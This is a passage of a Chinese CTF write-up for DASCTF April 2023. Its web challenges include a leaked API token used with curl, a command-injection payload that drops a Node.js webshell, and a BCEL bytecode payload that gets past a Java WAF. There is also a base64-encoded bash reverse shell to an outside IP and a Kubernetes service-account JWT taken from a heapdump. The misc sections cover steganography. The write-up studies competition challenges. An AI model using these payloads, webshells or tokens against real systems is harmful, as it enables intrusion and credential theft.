        out_file           : 'logs/out.log',
        log_file           : 'logs/all.log',
        log_date_format    : 'YYYY-MM-DD HH:mm:ss',
        max_memory_restart : '1G',
        env: {
            NODE_ENV       : 'development',
        },
        env_production: {
            NODE_ENV       : 'production',
        }
    }],
    deploy: {
        production: {
            // host          : CONFIG.remote.host,
            // user          : CONFIG.remote.user,
            // path          : CONFIG.remote.path,
            // repo          : CONFIG.git.ssh,
            // ref           : CONFIG.git.ref,
            'post-deploy' : 'npm install && pm2 reload ecosystem.config.js --env production'
        }
    }
};
```

先前app.js中有依赖注入在api对应的middlewares/api/index.js中
```js
const fs       = require('fs')
const path     = require('path')
const router   = require('koa-router')()
const tools    = require('../../utils')
const Response = require('../response')

const apiPath = path.join(__dirname, '../../api')

function registeApi (dir) {
    // 遍历目录下所有文件
    fs.readdirSync(dir).forEach(fileName => {
        // 文件完整路径
        const filePath = path.join(dir, fileName)

        // 若该文件为目录，则继续遍历该目录下所有文件
        if (fs.statSync(filePath).isDirectory()) return registeApi(filePath)
        // 忽略入口文件
        // if (filePath.endsWith('index.js'))       return
        // 忽略非 js 文件
        if (!filePath.endsWith('.js'))           return console.info('非 JS 文件不要放在 api 目录下' + filePath)

        regist(filePath);
    })
}

function regist(filePath) {
    // API
    const api     = require(filePath)
    // API 名称
    const apiName = getApiName(filePath)

    // 遍历请求方式
    for (const type of Object.keys(api)) {
        // 响应操作
        router[type](apiName, async (ctx) => {
            await api[type](getRequest(ctx), new Response(ctx))
        })
        // 打印接口信息
        apiLog(type, apiName)
    }
}

function getApiName(filePath) {
    return filePath.cutEnd(3)
        .replace(apiPath, '')
        .replace(/\\/g, '/')
}

function getRequest(ctx) {
    return {
        params : { ...ctx.request.body, ...tools.getUrlParams(ctx.request.url) },
        page   : tools.getPagination(ctx),
        ctx,
    }
}

function apiLog (type, apiName, apiIntro = '') {
    console.info(`${apiIntro}\n[${type.toUpperCase()}]: ${apiName}\n****************************************`)
}

registeApi(apiPath)

module.exports = (() => router.routes())()
```

程序逻辑基本就是会把目录下的js文件注册到前面F12中的`/v2/coding/versionList`里
访问对应js文件

```js
const path = require('path')
const coding = require('../../../request/coding')

const distExtname = [
    '.tgz',
    '.exe',
    '.dmg',
    '.AppImage',
]

module.exports = {
    async get(request, response) {
        const ProjectId = Number(request.params.ProjectId)

        let data = []

        const storeList = (await coding.post('/open-api', {
            Action: 'DescribeProjectDepotInfoList',
            ProjectId,
        })).data.Response.DepotData.Depots

        for (const store of storeList) {
            const versionList = (await coding.post('/open-api', {
                Action: 'DescribeGitReleases',
                DepotId: Number(store.Id),
                Status: 1,
                PageNumber: 1,
                PageSize: 100,
            })).data.Response.ReleasePageList.Releases

            data = [...data, ...versionList]
        }

        data.sort((a, b) => a.TagName < b.TagName ? 1 : -1)

        response.setData(data)
        response.success()
    }
}

```
发现request/coding还有东西

```js
const axios = require('axios')

// Access Token
const codingToken = 'token 71d51e2df468adb3e7053349fc4ff7cdc2ef1891'

const coding = axios.create({
    baseURL: 'https://e.coding.net',
    headers: {
        Authorization: codingToken,
    },
})

module.exports = coding
```

这里拿到了一个值token
这里看到这个url才反应过来，是一个代码项目，之前看山羊的前端有注册过，感觉下一步应该是类似之前数据安全的比赛的代码泄露
这里要找到对应的api接口，利用token进入项目，[CODING OPEN API](https://coding.net/help/openapi#%E5%9F%BA%E7%A1%80%E8%B7%AF%E5%BE%84)

![](attachments/Pasted%20image%2020230426115141.png)

`curl https://e.coding.net/open-api -H 'Authorization: token 71d51e2df468adb3e7053349fc4ff7cdc2ef1891' -d '{"Action":"DescribeCodingProjects"}'`

![](attachments/Pasted%20image%2020230426121323.png)



ID :11810011
`curl https://e.coding.net/open-api -H 'Authorization: token 71d51e2df468adb3e7053349fc4ff7cdc2ef1891' -d '{"Action":"DescribeProjectDepotInfoList", "ProjectId":11810011}'`

![](attachments/Pasted%20image%2020230426121457.png)

这里有对应的项目地址`https://vuln-git.coding.net/p/tel/d/hackedbytel`


本来想要直接把自己的账号拉进项目，但是一直没有找到自己的gk数组在哪里，就导入ssh来直接git clone了，前面有获得ssh的地址`git@e.coding.net:vuln-git/tel/hackedbytel.git`

![](attachments/Pasted%20image%2020230426124449.png)

clone的时候发现仓库空了。。。
之后就是找源码中的上传点，上传一个jswebshell，没有源码就直接贴官方的payload了

```shell
# use as curl
curl "https://114.117.174.147:18882/v3/UpdateAllProduct" \
         -H 'x-coding-event: ping1' \
         -X POST -k \
         --data-raw "artifact.artifactRepoName=12&artifact.artifactPkgName=\";echo 'Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpCmNvbnN0IHBhdGggPSByZXF1aXJlKCdwYXRoJykKY29uc3QgeyBleGVjU3luYyB9ID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpCgptb2R1bGUuZXhwb3J0cyA9IHsKICAgIC8vIEFQSSBQT1NUCiAgICBhc3luYyBwb3N0KHJlcXVlc3QsIHJlc3BvbnNlKSB7CiAgICAgICAgLy8gY29uc29sZS5sb2cocmVxdWVzdC5wYXJhbXMpCiAgICAgICAgYXJ0aWZhY3RQa2dOYW1lID0gcmVxdWVzdC5wYXJhbXMuYXJ0aWZhY3RQa2dOYW1lCiAgICAgICAgLy8gU2F2ZSBQYXRoCiAgICAgICAgY29uc3QgbG9jYWxEaXIgPSBfX2Rpcm5hbWUKICAgICAgICAvLyBjdXJsIGNvbW1hbmQKICAgICAgICBjb25zdCBjdXJsQ01EID0gYXJ0aWZhY3RQa2dOYW1lCiAgICAgICAgLy8gQ3JlYXRlIFBhdGgKICAgICAgICBmcy5ta2RpclN5bmMobG9jYWxEaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pCiAgICAgICAgLy8gZG93bmxvYWQgYXJ0aWZpY2F0ZQogICAgICAgIFJlc3BvbnNlRGF0YSA9IGV4ZWNTeW5jKGN1cmxDTUQsIHsgY3dkOiBsb2NhbERpciB9KS50b1N0cmluZygpCiAgICAgICAgLy8gUmVzcG9uc2UKICAgICAgICByZXNwb25zZS5zdWNjZXNzKFJlc3BvbnNlRGF0YSkKICAgIH0KfQ=='|base64 -d > /app/api/v2/badWebShell.js #\"&artifact.artifactVersionName=1.4&artifact.projectName=testing"
# python usage
python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja 
# https://nodejs-hack.cloud.eson.ninja replace your url 不要加 / 我的服务是禁止nodejs 外连其他服务 所以会导致内部的js的命令拼接执行时候的 curl 失效，导致一次 500 ，否则会返回服务正常更新的 json
# output like following
ic| file_data: 'Y29uc3<base64ed file data>AAA='
Traceback (most recent call last):
.....
httpx.ReadTimeout: The read operation timed out

```

>这里url用http会比较好，https似乎会报错

jswebshell.js
```js
const fs = require('fs')
const path = require('path')
const { execSync } = require('child_process')

module.exports = {
    // API POST
    async post(request, response) {
        // console.log(request.params)
        artifactPkgName = request.params.artifactPkgName
        // Save Path
        const localDir = __dirname
        // curl command
        const curlCMD = artifactPkgName
        // Create Path
        fs.mkdirSync(localDir, { recursive: true })
        // download artificate
        ResponseData = execSync(curlCMD, { cwd: localDir }).toString()
        // Response
        response.success(ResponseData)
    }
}
```
### ezjxpath #jxpath #BCEL

一开始看到有waf，感觉可以用试试编码码来绕过waf，结果细看直接把路堵死了，javawebshell黑魔法还没实战过
waf代码
```java
package com.example.first.utils;  
  
import java.io.UnsupportedEncodingException;  
import java.net.URLDecoder;  
import java.util.ArrayList;  
import java.util.Arrays;  
import java.util.List;  
import java.util.Locale;  
  
public class Waf {  
    private List<String> blacklist = new ArrayList(Arrays.asList("java.lang", "Runtime", "org.springframework", "javax.naming", "Process", "ScriptEngineManager"));  
  
    public boolean check(String s) throws UnsupportedEncodingException {  
        if (s.isEmpty()) {  
            return false;  
        } else {  
            String reals = URLDecoder.decode(s, "UTF-8").toUpperCase(Locale.ROOT);  
  
            for(int i = 0; i < this.blacklist.size(); ++i) {  
                if (reals.toUpperCase(Locale.ROOT).contains(((String)this.blacklist.get(i)).toUpperCase(Locale.ROOT))) {  
                    return false;  
                }  
            }  
  
            return true;  
        }  
    }  
  
    public Waf() {  
    }  
}
```

这里考虑的用BXEL字节码来做命令执行
不过这里需要自己去找一个类和方法来做bcel的加载，关于BCEL ClassLoader可以看p神的[BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)
在题目源码给出的jdk压缩包中存在对应的sun包有关于bcel的加载函数,`com.sun.org.apache.bcel.internal.util.JavaWrapper`

```java
/*  
 * Copyright (c) 2007, 2015, Oracle and/or its affiliates. All rights reserved. * ORACLE PROPRIETARY/CONFIDENTIAL. Use is subject to license terms. */package com.sun.org.apache.bcel.internal.util;  
  
/* ====================================================================  
 * The Apache Software License, Version 1.1 * * Copyright (c) 2001 The Apache Software Foundation.  All rights * reserved. * * Redistribution and use in source and binary forms, with or without * modification, are permitted provided that the following conditions * are met: * * 1. Redistributions of source code must retain the above copyright *    notice, this list of conditions and the following disclaimer. * * 2. Redistributions in binary form must reproduce the above copyright *    notice, this list of conditions and the following disclaimer in *    the documentation and/or other materials provided with the *    distribution. * * 3. The end-user documentation included with the redistribution, *    if any, must include the following acknowledgment: *       "This product includes software developed by the *        Apache Software Foundation (http://www.apache.org/)." *    Alternately, this acknowledgment may appear in the software itself, *    if and wherever such third-party acknowledgments normally appear. * * 4. The names "Apache" and "Apache Software Foundation" and *    "Apache BCEL" must not be used to endorse or promote products *    derived from this software without prior written permission. For *    written permission, please contact apache@apache.org. * * 5. Products derived from this software may not be called "Apache", *    "Apache BCEL", nor may "Apache" appear in their name, without *    prior written permission of the Apache Software Foundation. * * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE * DISCLAIMED.  IN NO EVENT SHALL THE APACHE SOFTWARE FOUNDATION OR * ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF * USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF * SUCH DAMAGE. * ==================================================================== * * This software consists of voluntary contributions made by many * individuals on behalf of the Apache Software Foundation.  For more * information on the Apache Software Foundation, please see * <http://www.apache.org/>. */  
import java.lang.reflect.*;  
  
/**  
 * Java interpreter replacement, i.e., wrapper that uses its own ClassLoader * to modify/generate classes as they're requested. You can take this as a template * for your own applications.<br>  
 * Call this wrapper with  
 * <pre>java com.sun.org.apache.bcel.internal.util.JavaWrapper &lt;real.class.name&gt; [arguments]</pre>  
 * <p>  
 * To use your own class loader you can set the "bcel.classloader" system property  
 * which defaults to "com.sun.org.apache.bcel.internal.util.ClassLoader", e.g., with * <pre>java com.sun.org.apache.bcel.internal.util.JavaWrapper -Dbcel.classloader=foo.MyLoader &lt;real.class.name&gt; [arguments]</pre>  
 * </p>  
 *  
 * @version $Id: JavaWrapper.java,v 1.3 2007-07-19 04:34:52 ofung Exp $  
 * @author  <A HREF="mailto:markus.dahm@berlin.de">M. Dahm</A>  
 * @see ClassLoader  
 */public class JavaWrapper {  
  private java.lang.ClassLoader loader;  
  
  private static java.lang.ClassLoader getClassLoader() {  
    String s = SecuritySupport.getSystemProperty("bcel.classloader");  
  
    if((s == null) || "".equals(s))  
      s = "com.sun.org.apache.bcel.internal.util.ClassLoader";  
  
    try {  
      return (java.lang.ClassLoader)Class.forName(s).newInstance();  
    } catch(Exception e) {  
      throw new RuntimeException(e.toString());  
    }  
  }  
  
  public JavaWrapper(java.lang.ClassLoader loader) {  
    this.loader = loader;  
  }  
  
  public JavaWrapper() {  
    this(getClassLoader());  
  }  
  
  /** Runs the _main method of the given class with the arguments passed in argv  
   *   * @param class_name the fully qualified class name  
   * @param argv the arguments just as you would pass them directly  
   */  public void runMain(String class_name, String[] argv) throws ClassNotFoundException  
  {  
    Class   cl    = loader.loadClass(class_name);  
    Method method = null;  
  
    try {  
      method = cl.getMethod("_main",  new Class[] { argv.getClass() });  
  
      /* Method _main is sane ?  
       */      int   m = method.getModifiers();  
      Class r = method.getReturnType();  
  
      if(!(Modifier.isPublic(m) && Modifier.isStatic(m)) ||  
         Modifier.isAbstract(m) || (r != Void.TYPE))  
        throw new NoSuchMethodException();  
    } catch(NoSuchMethodException no) {  
      System.out.println("In class " + class_name +  
                         ": public static void _main(String[] argv) is not defined");  
      return;    }  
  
    try {  
      method.invoke(null, new Object[] { argv });  
    } catch(Exception ex) {  
      ex.printStackTrace();  
    }  
  }  
  
  /** Default _main method used as wrapper, expects the fully qualified class name  
   * of the real class as the first argument.   */  public static void _main(String[] argv) throws Exception {  
    /* Expects class name as first argument, other arguments are by-passed.  
     */    if(argv.length == 0) {  
      System.out.println("Missing class name.");  
      return;    }  
  
    String class_name = argv[0];  
    String[] new_argv = new String[argv.length - 1];  
    System.arraycopy(argv, 1, new_argv, 0, new_argv.length);  
  
    JavaWrapper wrapper = new JavaWrapper();  
    wrapper.runMain(class_name, new_argv);  
  }  
}
```

直接把jdl里src解压把bcel的源码拖出来用，写个弹计算器的demo

![](attachments/Pasted%20image%2020230426141412.png)

```java
package com.wuwumonster.exp;  
import com.sun.org.apache.bcel.internal.classfile.JavaClass;  
import com.sun.org.apache.bcel.internal.classfile.Utility;  
import com.sun.org.apache.bcel.internal.Repository;  
  
public class bcel_byte {  
    public static void main(String []args) throws Exception {  
        decode();  
    }  
    protected static void encode() throws  Exception {  
        JavaClass cls = Repository.lookupClass(eval.class);  
        String code = Utility.encode(cls.getBytes(), true);  
        System.out.println("$$BCEL$$"+code);  
  
    }  
  
    protected static void decode() throws Exception {  
        com.sun.org.apache.bcel.internal.util.JavaWrapper._main(new String[]{"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbJ$c3P$Q$3d$a3i$d3$c6$a8$7d$f8$a8$f5$ad$L$5b$X$N$ee$84$8a$hQ$Q$82$V$xu$e1Bn$e3$a5$5ei$SI$93$b6$bf$e5F$c5$85$l$e0G$89$93X$ac$a0$G$ee$9c$3b$e7$ce$cc9C$de$3f$5e$df$A$eca$db$40$g$L$G$WQ$ca$60$v$c6$b2$8ee$j$x$84$f4$81$f2TxH$98$acT$5b$E$ed$c8$bf$95$84Y$5by$f2$yr$db2$b8$U$ed$$3$F$dbwD$b7$r$C$V$e7$pR$L$efT$8fP$b6$j$df$b5$G$d1$mr$7d$af$X$ca$c0$92$c3$HK$f6E$b7NH$dd$b8By$84$85$ca$b5$7d$_$fa$c2$ea$K$afc5$c3$40y$9dz$o$v$82N$9fP$fc$e3$99$60$i$P$j$f9$Q$w$9e$abc$95$f3$a6$l$F$8e$3cQ$b1$7c6$96$a8$c5$5d$stdt$ac$99X$c7$G$n$c3V$9d$9a$iJ$T$9b$d8$o$94$fe$f3G$c8$8dE$h$ed$7b$e9$84$ec$q$a1$94o$9d6$be$d5$J$f9q$e1E$e4$85$cae$DFG$86$df$c9$7c$a5j$ff$aa$e1$V4$f6$e1$Qv$w$7f$ac$ff$83$3a$P$7cG$f6zuv$9c$e2$bf$V$7f$T$a0x$_$8eY$ce$yFbL$ed$3e$83$k$93g$83c$fa$8b$c4$UGst71$cd$98$c5$Mf$b9$wn$deO$86$B$c6$L$s$K$93O$d0$ae$c6$T$MF$b0P$96$a5$c6S$M$e4$90g$y$f0$d1$98$v$f2$99Kz$e6$3f$B$pS$40$ffX$C$A$A","s"});  
  
    }  
}
```

修改下字节码内容直接弹shell
```java
package com.wuwumonster.exp;  
  
import java.io.IOException;  
  
public class eval {  
    public eval() {  
    }  
  
    public static void _main(String[] argv) throws IOException {  
        Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjA2LjM3LzIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}");  
    }  
}
```

![](attachments/Pasted%20image%2020230426141758.png)

payload 
```
query=runMain(com.sun.org.apache.bcel.internal.util.JavaWrapper.new(),"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuR$5dO$TA$U$3d$D$db$$$5dW$81$o$88$f8U$f5$c1$a2$ad$ab$d0$Y$92$8aIS$c4$94$ecR$a5Z$a3$3e$98$e92$d9$ce$a6$bbK$f6$a3$d4$o$3f$ca$X5$3e$f8$D$fcQ$c6$bb$L$a1$s$e2$qs$cf$dc3$f7$9e$3b$f7f$7e$fd$fe$f1$T$c0c$dc$d5$90$c7$92$86$xX$9e$c1$d5$UWT$5cSq$9d$n$ffT$fa2$7e$c60$5d$5e$ed2$u$cd$60_0$cc$9a$d2$X$bb$89$d7$T$e1k$de$h$QS4$D$9b$P$ba$3c$94$a9$7fJ$wq_F$M$x$a6$jx$c6ar$98x$81$l$c5$o4$c4$e8$c0$QC$3e$a83$e4$3ez$5c$fa$MK$e5$P$a6$cb$87$dc$Yp$df1$3aq$u$7d$a7$9e$95$e4$a13dX8$e7$9aA$7b$3e$b2$c5A$yIW$c5$N$f2$3bA$S$dab$5b$a6$e5$Li$89$87i$96$O$V3$wn$ea$b8$85$S$D$ef$f1$a8_$aa$da$a5$pa$f7$83$ca$3bo$7b$cc$9b$8d$98w$g$Pvdc$f8$feEw$cd$5c$dfs$ed$e6$c6$a3v$a7$f6$c9$g$b7$S$cbm$ac$99$ae$b5n$8e$5b$e3$dd$ad7$8e$b5U$f3$acW$9b$9b$c7$9f$8fHL$3c$a9U$aa$fb$t$e7$7e$a5$w$8fu$dc$c6$j$86$e5$ff5$ce07$e9$a6$dds$85$jS$8b$Z$r$D$a3$d5$3ek$8ba$7e$S$b8$97$f8$b1$f4$a83$cd$R$f1$99$b3X$5e5$ff$89$a1$d9$ub$ql$86$7b$e5s$e6$fa$X$f52$Ml$REuzq$8e$beA$ba$a6$c0$d2$81$91$z$90g$Q2$c2$dc$fdo$60_$b2k$8dl$fe$84$c4$F$b2$fa$e9Y$c7E$c2$C$$a$96$a2$d2$e4$8dL$M$d0$bec$aa8$fd$V$ca$db$89$82F$I$wT$a0R$T$V$Ns$98$t$y$d2V$88Y$a0$7d9$cbY$fc$D$c3$a4$t$5e$b1$C$A$A",'')
```
## Misc
###  secret of bkfish
一张图片，放010尾部还有图片

![](attachments/Original_1.png)

![](attachments/Pasted%20image%2020230424140816.png)

有点长手动分离

分离出来的图片在stagesolve里  red0有东西

![](attachments/Pasted%20image%2020230424142026.png)

提一下
![](attachments/Pasted%20image%2020230424142930.png)

最后是cyberchef爆破出来

DASCTF{wE1ComE_t0_DAsc7f_x_Su__apri1}

### Ge9ian's Girl
解压后有个doc和rar
doc有隐藏文章打开就可以

![](attachments/Pasted%20image%2020230423113635.png)

```text
Sｈe lіkes Ｊａyｃhoｕ as much as І ｄｏ. Iｎ additioｎ， dｕrіｎg οｕr leiｓｕｒe ｔｉme， ｗe alsｏ lｉｋｅ to pｌay QQ Flｙіng Ϲars ｔoｇeｔheｒ． Oh， by tｈe way, ｓhｅ aｌso ｌikes ϹΤF， aｎｄ ｓｈe ｓaіd tｈat men whｏ can pｌａy ϹTF ａre ｔｈe ｍoｓt haｎdｓoｍｅ！ I often study with her, and once we learned about Twitter Secret Messages together. Do you know what this is?
```

提到了==Twitter Secret Messages ==
[Twitter Secret Messages - Steganography (holloway.nz)](https://holloway.nz/steg/)

![](attachments/Pasted%20image%2020230423114147.png)


压缩包密码 keainvren,比赛的时候少复制一个空格变成了keainvreg。。。
压缩包解压后有大量的txt，把第一个扔到010里后发现是jpg头，猜测是读取所有的txt然后拼起来

![](attachments/Pasted%20image%2020230423114342.png)

```python
with open("flag.jpg","wb") as f:  
    for i in range(1,521):  
        file_txt = f"./two/{i}.txt"  
        with open(file_txt, "rb") as ft:  
            data = ft.read()  
        f.write(data)
    
```

给图片补上文件头 FFD8FF

![](attachments/flag_header.jpg)


图片属性

![](attachments/Pasted%20image%2020230423115430.png)

密码 Ge9ian， oursecret这个是知识盲区

![](attachments/Pasted%20image%2020230423120710.png)

![](attachments/Pasted%20image%2020230423120512.png)

DASCTF{426cb864312d5e30e3eef2950ea4826c}

### 七里香

评价是以后txt要用sublime打开这样可以发现零宽

![](attachments/Pasted%20image%2020230423121243.png)

![](attachments/Pasted%20image%2020230423121235.png)

```text
This is not only a hint, but also a keyfile.
```


`tpyrcarev` 结合hint 很明显是倒过来`veracrypt` 那这个hint.txt就是密钥文件

rar有密码，结合Ge9ian 知道是《搁浅》这首歌，到2分10秒还是搁浅

![](attachments/Pasted%20image%2020230423122532.png)

压缩包密码尝试搁浅，搁浅失败，看了别的师傅wp，才知道密码是Jay和J4y交替。。。。虽然这次misc是杰伦专场但是不说谁知道啊

解压脚本直接贴了

```python
import io  
import zipfile  
  
  
with open("210.zip", "rb") as f:  
    data = f.read()  
  
all_files_processed = False  # 初始化标志变量  
  
  
count = 0  
pwds = ["J4y", "Jay"]  
while True:  
    with zipfile.ZipFile(io.BytesIO(data), "r") as zf:  
        for i in zf.filelist:  
            print(i.filename)  
            data = io.BytesIO(zf.read(i.filename, pwd=pwds[count % 2].encode()))  
            if zipfile.is_zipfile(data):  
                data = zf.read(i.filename, pwd=pwds[count % 2].encode())  
            else:  
                all_files_processed = True  
                with open(i.filename, "wb") as f:  
                    f.write(zf.read(i.filename, pwd=pwds[count % 2].encode()))  
        count += 1  
  
        if all_files_processed:  
            break
```

解出来的qlx.txt

```text
Maybe you know Ge9ian 'Girl's favorite song


Do you know Ge9ian's favorite song


He often uses the pinyin lowercase letters of this song as the password for the encryption container


Oh, by the way, it's from the same album as the following song


It rained all night, and my love overflowed like rain


The fallen leaves in the yard are thick with my longing


A few words of right and wrong cannot cool down my passion


You appear on every page of my poetry


It rained all night, and my love overflowed like rain


The butterfly on the windowsill is like a beautiful chapter flying in a poem


I will continue to write


Write loving you forever at the end of the poem


You are the only understanding I want
```

但是其实并不需要这个压缩包的解压，在前面知道是搁浅后又概率进行mp3的varecypt的搁浅尝试 
把密钥文件设置为hint.txt 密码 geqian，这里不要开TrueCrypt

![](attachments/Pasted%20image%2020230423125711.png)

挂好后有一张bmp，明显的宽高修改，且尾部又压缩包

![](attachments/Pasted%20image%2020230423130059.png)

解压后是霓虹语

```txt
まずこのtxtにはあなたが欲しいflagはありません。
でもおめでとう。フラッグにはもう近い。
あなたがflagを見つけたとき、私が用意してくれた『七里香』を聞いているかもしれません。
あ、そうだ、こっそり教えてあげる：「土犬」はとてもかわいい女の子です。
```

![](attachments/Pasted%20image%2020230423130241.png)

这个bmp图片是有问题的大概是宽高被修改，修不来，emm最后好像也没有修的必要

但是可以注意到存在的mp3文件头被FFFF间隔开

![](attachments/Pasted%20image%2020230424150229.png)

需要重008Ch开始隔位读取
这里贴别的师傅的脚本

```python
with open("40.bmp", "rb") as f:
	data = f.read()[0x8C:0xD0000]
with open("flag.mp3", "wb") as f:
	for i in range(0, len(data), 4):
		f.write(data[i:i+2])
```

最后尾部有base64

WW91IGFyZSBncmVhdCEhISBEQVNDVEZ7ZjI5NDM4OTFlNzE5NjM1YTVmNmMyOTUyMjcxNzdkZGJ9

![](attachments/Pasted%20image%2020230424151633.png)

You are great!!! DASCTF{f2943891e719635a5f6c295227177ddb}


### 云
首页给了hint

![](attachments/Pasted%20image%2020230424161815.png)

在https://dasctf-4-cloud-hacking.cloud.eson.ninja/actuator/heapdump拿到了内存dump
MAT分析，这misc还得是web手做
工具使用 [(58条消息) Java内存分析工具MAT(Memory Analyzer Tool)安装使用实例_Jin_Kwok的博客-CSDN博客](https://blog.csdn.net/Jin_Kwok/article/details/80326088)

在info里发现了 kubernetes 大抵是作为容器，加上前面给出的数据库端口和配置一起寄，应该是要去找到对应的数据库密码，在数据库中去找flag

下面就只能贴wp了
在mat中
>Spring Cloud K8s 中通常会维护一个持有 class io.kubernetes.client.util.credentials.TokenFileAuthentication 对象的bean，使得serviceaccount Token长期驻留在内存中


![](attachments/Pasted%20image%2020230424172517.png)

jwt

![](attachments/Pasted%20image%2020230424172601.png)

token
```jwt
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtVTWNEcC1QaG5HYXJJTjRPbjJrY0M1UkZURjIyTTZQcGF3WXpNOU5YaUUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzEzODU2MTQzLCJpYXQiOjE2ODIzMjAxNDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkb2xwaGluLWN0ZiIsInBvZCI6eyJuYW1lIjoiZGVwbG95LWN0Zi03Zjg1ZDdiNDVjLWhoN2ZsIiwidWlkIjoiMTUyYzU1NWYtNGY4ZS00ZDQxLWExMGYtZDYyZjBiNmUwM2JmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJqYXZhLXN1cGVydmlzb3IiLCJ1aWQiOiI0ZjZmYWU5MC00YzdhLTQ1YTYtYTAwMy03ZGE0ZWU4MjdjOGMifSwid2FybmFmdGVyIjoxNjgyMzIzNzUwfSwibmJmIjoxNjgyMzIwMTQzLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZG9scGhpbi1jdGY6amF2YS1zdXBlcnZpc29yIn0.IMQjIi8mH5wj1EguPNlKlcetI3YLX9v9719uV3YPK3mGzigcScF0Q1P-puT9h4zuXqhnJC5foMxA70eZ-QNgoGuaJiKPgERKuldLALZ73UF63lKcelDMSNDQsQ_GS4vHDniZotyrrH9bjJnABD7q7RnJuw7HQ_ZWjUUA5goWTKZg8BP_mbWbcttl3kjhv_F7kCWeKVNA1wsxFkuMBar3xZKjifZi_QpmoktShKZlmtyT-zW8W-3CQvfL5PYboXUvq0Hr9BKI3lCcMnSrjkvppDihtR79IPMR0-6VBG46R6YbvgIjHAr1lZCekwkBIbj5q9EpcdjXZ9OWmkPmqsIAsg
```

```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1713856143,
  "iat": 1682320143,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "dolphin-ctf",
    "pod": {
      "name": "deploy-ctf-7f85d7b45c-hh7fl",
      "uid": "152c555f-4f8e-4d41-a10f-d62f0b6e03bf"
    },
    "serviceaccount": {
      "name": "java-supervisor",
      "uid": "4f6fae90-4c7a-45a6-a003-7da4ee827c8c"
    },
    "warnafter": 1682323750
  },
  "nbf": 1682320143,
  "sub": "system:serviceaccount:dolphin-ctf:java-supervisor"
}
```

到后面太难了k8s玩不明白

[使用 kubeconfig 文件配置跨集群认证 · Kubernetes 中文指南——云原生应用架构实战手册 (jimmysong.io)](https://jimmysong.io/kubernetes-handbook/guide/authenticate-across-clusters-kubeconfig.html)
## 总结 #OURSECRET #零宽隐写
- 看了其他师傅的wp 似乎oursecret的特征是 尾部含有 `ž—º*`
- 零宽用sublime打开可以直接发现 解密网址 [Zero Width Lib (yuanfux.github.io)](https://yuanfux.github.io/zero-width-web/)

## 参考文章

[DomPDF库反序列化RCE漏洞分析 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/79602.html)

[CVE-2022-41343 - 通过 Phar 反序列化的 RCE (buaq.net)](https://buaq.net/go-129526.html)

[DASCTF Apr.2023 X SU战队2023开局之战-WriteUp | Byxs20's Blog](https://byxs20.github.io/posts/42486.html#3-%E4%B8%83%E9%87%8C%E9%A6%99)

[BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

[(58条消息) Java内存分析工具MAT(Memory Analyzer Tool)安装使用实例_Jin_Kwok的博客-CSDN博客](https://blog.csdn.net/Jin_Kwok/article/details/80326088)

[使用 kubeconfig 文件配置跨集群认证 · Kubernetes 中文指南——云原生应用架构实战手册 (jimmysong.io)](https://jimmysong.io/kubernetes-handbook/guide/authenticate-across-clusters-kubeconfig.html)